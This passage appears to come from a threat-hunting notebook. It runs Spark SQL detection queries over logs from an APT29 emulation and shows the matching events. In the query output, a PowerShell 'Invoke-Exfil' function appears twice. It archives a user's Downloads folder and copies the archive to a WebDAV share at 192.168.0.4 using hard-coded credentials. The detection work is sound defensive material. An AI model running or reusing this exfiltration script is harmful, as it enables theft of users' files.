<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | function Invoke-Exfil {

    if (!(Get-Module -Name &quot;7Zip4Powershell&quot;)) { Write-Host &quot;[*] Installing 7Zip4Powershell module&quot;; Install-Module -Name 7Zip4Powershell -Force }

    Write-Host &quot;[*] Compressing all the things in download dir&quot;
    Compress-7Zip -Path &quot;$env:USERPROFILE\Downloads\&quot; -Filter * -Password &quot;lolol&quot; -ArchiveFileName &quot;$env:APPDATA\OfficeSupplies.7z&quot;

    $UserName = &quot;cozy&quot;
    $Password = &quot;MyCozyPassw0rd!&quot; | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare = &quot;WebDavShare&quot;
    $uri = &quot;\\192.168.0.4\webdav&quot;

    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
    
    Write-Host &quot;[*] Creating a temporary mapped network drive - WebDavShare&quot;
    New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds

    Write-Host &quot;[*] Copying data to WebDavShare&quot;
    Copy-Item &quot;$env:APPDATA\OfficeSupplies.7z&quot; &quot;WebDavShare:\OfficeSupplies.7z&quot; -Force

    Write-Host &quot;[*] Removing temporary network share&quot;
    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue

    Invoke-BeachCleanup
} 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:B19F8E16-AA6C-45C1-8A0D-92812830C237</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.ScriptBlockText</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">AND f.EventID = 4104</span>
<span class="sd">AND LOWER(f.ScriptBlockText) LIKE &quot;%copy-item%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ScriptBlockText | function Invoke-Exfil {

    if (!(Get-Module -Name &quot;7Zip4Powershell&quot;)) { Write-Host &quot;[*] Installing 7Zip4Powershell module&quot;; Install-Module -Name 7Zip4Powershell -Force }

    Write-Host &quot;[*] Compressing all the things in download dir&quot;
    Compress-7Zip -Path &quot;$env:USERPROFILE\Downloads\&quot; -Filter * -Password &quot;lolol&quot; -ArchiveFileName &quot;$env:APPDATA\OfficeSupplies.7z&quot;

    $UserName = &quot;cozy&quot;
    $Password = &quot;MyCozyPassw0rd!&quot; | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare = &quot;WebDavShare&quot;
    $uri = &quot;\\192.168.0.4\webdav&quot;

    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
    
    Write-Host &quot;[*] Creating a temporary mapped network drive - WebDavShare&quot;
    New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds

    Write-Host &quot;[*] Copying data to WebDavShare&quot;
    Copy-Item &quot;$env:APPDATA\OfficeSupplies.7z&quot; &quot;WebDavShare:\OfficeSupplies.7z&quot; -Force

    Write-Host &quot;[*] Removing temporary network share&quot;
    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue

    Invoke-BeachCleanup
} 
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="id53">
<h3>Detection Type:technique(Alert)<a class="headerlink" href="#id53" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:C10730EA-6345-4934-AA0F-B0EFCA0C4BA6</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND CommandLine RLIKE &#39;.*rundll32.exe.*\\\\\\\\windows\\\\\\\\system32\\\\\\\\davclnt.dll.*DavSetCookie.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:08:50.846
ProcessGuid: {47ab858c-e442-5eac-ec03-000000000400}
ProcessId: 3268
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=7662A8D2F23C3474DEC6EF8E2B0365B0B86714EE,MD5=F68AF942FD7CCC0E7BAB1A2335D2AD26,SHA256=11064E9EDC605BD5B0C0A505538A0D5FD7DE53883AF342F091687CAE8628ACD0,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {47ab858c-e43f-5eac-eb03-000000000400}
ParentProcessId: 8984
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\windows\system32\svchost.exe -k LocalService -p -s WebClient 
-RECORD 1-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:08:50.963
ProcessGuid: {47ab858c-e442-5eac-ed03-000000000400}
ProcessId: 1652
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=7662A8D2F23C3474DEC6EF8E2B0365B0B86714EE,MD5=F68AF942FD7CCC0E7BAB1A2335D2AD26,SHA256=11064E9EDC605BD5B0C0A505538A0D5FD7DE53883AF342F091687CAE8628ACD0,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {47ab858c-e43f-5eac-eb03-000000000400}
ParentProcessId: 8984
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\windows\system32\svchost.exe -k LocalService -p -s WebClient 
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:10:22.994
ProcessGuid: {47ab858c-e49e-5eac-ef03-000000000400}
ProcessId: 964
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=7662A8D2F23C3474DEC6EF8E2B0365B0B86714EE,MD5=F68AF942FD7CCC0E7BAB1A2335D2AD26,SHA256=11064E9EDC605BD5B0C0A505538A0D5FD7DE53883AF342F091687CAE8628ACD0,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {47ab858c-e43f-5eac-eb03-000000000400}
ParentProcessId: 8984
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\windows\system32\svchost.exe -k LocalService -p -s WebClient  
-RECORD 3-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:10:23.065
ProcessGuid: {47ab858c-e49f-5eac-f003-000000000400}
ProcessId: 8580
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=7662A8D2F23C3474DEC6EF8E2B0365B0B86714EE,MD5=F68AF942FD7CCC0E7BAB1A2335D2AD26,SHA256=11064E9EDC605BD5B0C0A505538A0D5FD7DE53883AF342F091687CAE8628ACD0,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {47ab858c-e43f-5eac-eb03-000000000400}
ParentProcessId: 8984
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\windows\system32\svchost.exe -k LocalService -p -s WebClient 
-RECORD 4-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:10:23.154
ProcessGuid: {47ab858c-e49f-5eac-f103-000000000400}
ProcessId: 2152
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=7662A8D2F23C3474DEC6EF8E2B0365B0B86714EE,MD5=F68AF942FD7CCC0E7BAB1A2335D2AD26,SHA256=11064E9EDC605BD5B0C0A505538A0D5FD7DE53883AF342F091687CAE8628ACD0,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {47ab858c-e43f-5eac-eb03-000000000400}
ParentProcessId: 8984
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\windows\system32\svchost.exe -k LocalService -p -s WebClient 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-1-remote-system-discovery">
<h2>8.A.1. Remote System Discovery<a class="headerlink" href="#a-1-remote-system-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated remote systems using LDAP queries</p>
<p><strong>Criteria:</strong> powershell.exe making LDAP queries over port 389 to the Domain Controller (10.0.0.4)</p>
<div class="section" id="id54">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id54" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:C1307FC1-19B7-467B-9705-95147B492CC7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">SELECT d.ProcessId, d.ParentProcessId</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">  FROM apt29Host a</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT ProcessGuid</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">        AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">        AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">  ) b</span>
<span class="sd">  ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">  WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND a.EventID = 1</span>
<span class="sd">    AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND d.EventID = 1</span>
<span class="sd">  AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessId = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND f.EventID = 3</span>
<span class="sd">  AND f.DestinationPort = 389</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 03:09:04.505
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59957
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.0.4
DestinationHostname: -
DestinationPort: 389
DestinationPortName: - 
-RECORD 1--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 03:09:04.482
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59955
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.0.4
DestinationHostname: -
DestinationPort: 389
DestinationPortName: - 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:542C2E36-0BC0-450B-A34F-C600E9DC396B</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN(</span>
<span class="sd">      SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT NewProcessId</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">            AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ProcessId = b.NewProcessId</span>
<span class="sd">      WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">        AND a.EventID = 4688</span>
<span class="sd">        AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">        AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ProcessId = c.NewProcessId</span>
<span class="sd">    WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">      AND d.EventID = 4688</span>
<span class="sd">      AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(CAST(f.ProcessId as INT))) = e.NewProcessId</span>
<span class="sd">WHERE LOWER(f.Channel) = &quot;security&quot;</span>
<span class="sd">    AND EventID = 5156</span>
<span class="sd">    AND DestPort = 389</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		3852
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59957
	Destination Address:	10.0.0.4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
-RECORD 1-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		3852
	Application Name:	\device\harddiskvolume2\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59955
	Destination Address:	10.0.0.4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-2-remote-system-discovery">
<h2>8.A.2. Remote System Discovery<a class="headerlink" href="#a-2-remote-system-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Established WinRM connection to remote host NASHUA (10.0.1.6)</p>
<p><strong>Criteria:</strong> Network connection to NASHUA (10.0.1.6) over port 5985</p>
<div class="section" id="id55">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id55" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:0A5428EA-171D-4944-B27C-0EBC3D557FAD</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">SELECT d.ProcessId, d.ParentProcessId</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">  FROM apt29Host a</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT ProcessGuid</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">        AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">        AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">  ) b</span>
<span class="sd">  ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">  WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND a.EventID = 1</span>
<span class="sd">    AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND d.EventID = 1</span>
<span class="sd">  AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessId = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND f.EventID = 3</span>
<span class="sd">  AND f.DestinationPort = 5985</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 03:09:29.633
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59962
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.1.6
DestinationHostname: -
DestinationPort: 5985
DestinationPortName: - 
-RECORD 1---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 03:09:28.426
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59961
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.1.6
DestinationHostname: -
DestinationPort: 5985
DestinationPortName: - 
-RECORD 2---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 03:09:27.510
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59960
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.1.6
DestinationHostname: -
DestinationPort: 5985
DestinationPortName: - 
-RECORD 3---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 03:09:23.801
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
